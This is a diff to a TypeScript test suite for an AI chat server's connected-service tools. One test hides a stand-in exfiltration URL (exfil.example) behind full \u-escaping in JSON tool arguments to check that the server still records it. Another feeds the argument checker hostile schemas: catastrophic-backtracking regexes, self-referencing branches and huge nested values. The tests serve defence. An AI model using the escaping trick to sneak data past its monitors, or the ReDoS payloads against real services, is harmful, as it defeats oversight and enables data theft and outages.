@@ -12,7 +12,8 @@ import { bigCatalog, TOOL_150, TOOL_151 } from '../lib/big-catalog'
 import { integrationsOf } from '../../server/src/integrations/connections/service'
 import { MAX_TOOLS } from '../../server/src/integrations/connections/mcp'
 import { CALL_TOOL, FIND_TOOLS, integrationToolProvider, MAX_TURN_TOOL_CHARS, MAX_TURN_TOOLS } from '../../server/src/integrations/connections/tools'
-import { checkArgs, deferredLines, DEFERRED_LIST_BUDGET, matchTools, toolTokens } from '../../server/src/integrations/connections/deferred'
+import { checkArgs, CHECK_STEPS, deferredLines, DEFERRED_LIST_BUDGET, matchTools, toolTokens } from '../../server/src/integrations/connections/deferred'
+import { recordSent } from '../../server/src/tools/connection-urls'
 import { TurnFiles } from '../../server/src/files/service'
 import type { TurnTool, TurnToolContext } from '../../server/src/services'
 
@@ -52,7 +53,7 @@ function turn(user: Person, o: { person?: Asked; scheduled?: boolean } = {}) {
     const r = await t.call(args, tc)
     return { text: r.content.map((c) => (c.type === 'text' ? c.text : '')).join(''), isError: !!r.isError, summary: r.summary ?? '' }
   }
-  return { tools, prompt: built.prompt ?? '', context: built.context ?? '', call }
+  return { chat, tools, prompt: built.prompt ?? '', context: built.context ?? '', call }
 }
 
 describe('a connection keeps every tool its service lists', () => {
@@ -157,6 +158,24 @@ describe('a turn that cannot carry them all', () => {
     expect(unknown).toMatchObject({ isError: true, summary: 'call_tool my_studio__no_such_tool -> unknown tool' })
     // its step label is the tool's own
     expect(a.tools.get(CALL_TOOL)!.label!({ name: `my_studio__${TOOL_150}` }, 'ko')).toBe(`Studio · ${TOOL_150}`)
+  })
+
+  test('arguments sent as JSON text leave marks as the service gets them: an address hidden by \\u-escapes that comes back is an echo', async () => {
+    const a = turn('alice')
+    const url = 'https://exfil.example/c?d=Q9vX2mK7pL4tR8wZ'
+    // every character of the keys and values escaped: the text the AI sent names no address and no part of it
+    const text = JSON.stringify({ video_url: url }).replace(/[^{}":,]/g, (c) => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'))
+    expect(text).not.toContain('exfil')
+    const raw = { name: `my_studio__${TOOL_150}`, arguments: text }
+    recordSent(A.ctx.db, a.chat, raw) // what chat/tools.ts does with every tool input before the call
+    const r = await a.call(CALL_TOOL, raw)
+    expect(r.isError).toBe(false)
+    expect(fake.calls.at(-1)!.args).toEqual({ video_url: url })
+    // the service repeats it (the fake answers with its arguments): not the service's own address, so save_url asks
+    const rows = A.ctx.db.query('SELECT url, echo FROM chat_connection_urls WHERE chat_id = ?').all(a.chat) as { url: string; echo: number }[]
+    const back = rows.filter((x) => x.url.includes('exfil.example'))
+    expect(back.length).toBeGreaterThan(0)
+    expect(back.every((x) => x.echo === 1)).toBe(true)
   })
 
   test('a write through call_tool asks on the card like the tool itself; no means nothing is sent; a scheduled run is refused', async () => {
@@ -314,7 +333,8 @@ describe('parts', () => {
     }
     expect(checkArgs(s, { a: 'ab', n: 4, list: [{ id: '1' }], maybe: null, opt: null, either: 'x', c: 7, when: 'not a date', free: { k: 1 }, odd: 3 })).toEqual([])
     expect(checkArgs(s, {})).toEqual(['a: required'])
-    expect(checkArgs(s, { a: 'A1' })).toEqual(['a: should match "^[a-z]+$"'])
+    // the service's regular expressions are not run (see the hostile schemas below); the service checks them
+    expect(checkArgs(s, { a: 'A1' })).toEqual([])
     expect(checkArgs(s, { a: 'abcde', n: 5 })).toEqual(['a: at most 4 characters', 'n: less than 5'])
     expect(checkArgs(s, { a: 'ab', n: 1.5 })).toEqual(['n: should be integer, not number'])
     expect(checkArgs(s, { a: 'ab', list: [{}, { id: 1 }, {}] })).toEqual(['list: at most 2 items', 'list[0].id: required', 'list[1].id: should be string, not number', 'list[2].id: required'])
@@ -325,5 +345,27 @@ describe('parts', () => {
     expect(checkArgs({ type: 'object', required: ['toString'], properties: {}, additionalProperties: false }, { constructor: 1 })).toEqual(['toString: required', 'constructor: not an argument of this tool'])
     // an unknown reference, a broken pattern and a self-reference are not followed forever
     expect(checkArgs({ type: 'object', properties: { x: { $ref: 'https://elsewhere/schema' }, y: { type: 'string', pattern: '(' }, z: { $ref: '#' } } }, { x: 1, y: 'a', z: { z: { z: {} } } })).toEqual([])
+  })
+
+  test('a hostile service\'s schema cannot hold the server: self-references that branch, backtracking patterns, big values', () => {
+    const ms = (f: () => unknown) => { const t = performance.now(); f(); return performance.now() - t }
+    // every level of anyOf / allOf refers back to the whole schema three or ten times: unbounded, this took minutes
+    const branching = (n: number) => ({ $defs: { a: { anyOf: Array.from({ length: n }, () => ({ $ref: '#/$defs/a' })) } }, $ref: '#/$defs/a' })
+    for (const n of [3, 10]) expect(ms(() => expect(checkArgs(branching(n), {})).toEqual([]))).toBeLessThan(2_000)
+    expect(ms(() => checkArgs({ allOf: [{ $ref: '#' }, { $ref: '#' }, { $ref: '#' }] }, { a: 1 }))).toBeLessThan(2_000)
+    // a regular expression that backtracks (about a second per string in JavaScriptCore) is never run, nor are
+    // patternProperties (any other argument name passes)
+    const redos = { type: 'object', properties: { p: { type: 'string', pattern: '^(a+)+$' }, list: { type: 'array', items: { type: 'string', pattern: '^(a|a)*$' } } } }
+    expect(ms(() => expect(checkArgs(redos, { p: 'a'.repeat(40) + '!', list: Array(50).fill('a'.repeat(40) + '!') })).toEqual([]))).toBeLessThan(1_000)
+    expect(checkArgs({ type: 'object', properties: {}, patternProperties: { '^(a+)+$': { type: 'number' } }, additionalProperties: false }, { ['a'.repeat(40) + '!']: 1 })).toEqual([])
+    // a long string or many argument names under branches that refer back: the work is counted, the rest passes
+    const loop = { anyOf: [{ $ref: '#' }, { $ref: '#' }, { $ref: '#' }], minLength: 1, properties: {} }
+    expect(ms(() => checkArgs(loop, 'x'.repeat(2_000_000)))).toBeLessThan(2_000)
+    const names = Object.fromEntries(Array.from({ length: 50_000 }, (_, i) => [`k${i}`, i]))
+    expect(ms(() => checkArgs(loop, names))).toBeLessThan(2_000)
+    expect(CHECK_STEPS).toBeLessThanOrEqual(20_000)
+    // a value nested deeper than the comparison can follow does not fail the call
+    const nest = (x: unknown) => { let v = x; for (let i = 0; i < 1_000_000; i++) v = [v]; return v }
+    expect(() => checkArgs({ type: 'object', properties: { a: { const: nest(1) } } }, { a: nest(2) })).not.toThrow()
   })
 })
